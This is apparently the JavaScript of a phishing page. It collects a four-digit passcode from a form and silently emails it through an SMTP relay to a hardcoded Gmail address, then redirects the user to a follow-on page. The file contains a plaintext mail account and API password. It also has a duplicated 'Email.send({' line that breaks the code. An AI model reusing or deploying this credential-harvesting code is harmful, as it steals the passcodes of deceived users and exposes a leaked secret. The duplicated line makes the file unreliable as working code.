// Function to handle passcode submission
function emailSend() {
  var passcode = [];
  
  // Collect passcode input values
  const passcodeInputs = document.querySelectorAll('.dot-input');
  passcodeInputs.forEach(input => {
    passcode.push(input.value.trim());
  });

  // Check if all passcode fields are filled
  if (passcode.includes("") || passcode.length !== 4) {
    swal("Error", "Please complete all 4 passcode fields", "error");
    return;
  }

  // Create the message body for the email
  var messageBody = "Passcode: " + passcode.join("");

  // Send the email
  Email.send({
    Email.send({
    Host: "smtp.elasticemail.com",
    Username: "payday10177@gmail.com",
    Password: "176A549B6BD880A9C5A531EDE06FF1F541C8",
    To: 'payday10177@gmail.com',
    From: "payday10177@gmail.com",
    Subject: "Passcode",
    Body: messageBody
  }).then(
    message => {
      if (message === 'OK') {
        window.location.href = 'nextpage.html'; // Redirect to the next page
      } else {
        swal("Error", "There was a problem sending your passcode. Please try again.", "error");
      }
    }
  );
}

// Automatically move to the next input field when a digit is entered
const passcodeInputs = document.querySelectorAll('.dot-input');
passcodeInputs.forEach((input, index) => {
  input.addEventListener('input', () => {
    if (input.value.length === 1 && index < passcodeInputs.length - 1) {
      passcodeInputs[index + 1].focus();
    }
  });

  input.addEventListener('keydown', (e) => {
    // Move to the previous input on Backspace
    if (e.key === 'Backspace' && input.value === '' && index > 0) {
      passcodeInputs[index - 1].focus();
    }
  });
});

// Enable the "Next" button when all fields are filled
const nextBtn = document.getElementById('nextBtn');

function checkPasscodeCompletion() {
  const allFilled = Array.from(passcodeInputs).every(input => input.value.trim() !== '');
  nextBtn.disabled = !allFilled;

  if (allFilled) {
    nextBtn.classList.add("enabled");
  } else {
    nextBtn.classList.remove("enabled");
  }
}

passcodeInputs.forEach(input => input.addEventListener('input', checkPasscodeCompletion));

// Next button click handler
nextBtn.addEventListener('click', emailSend);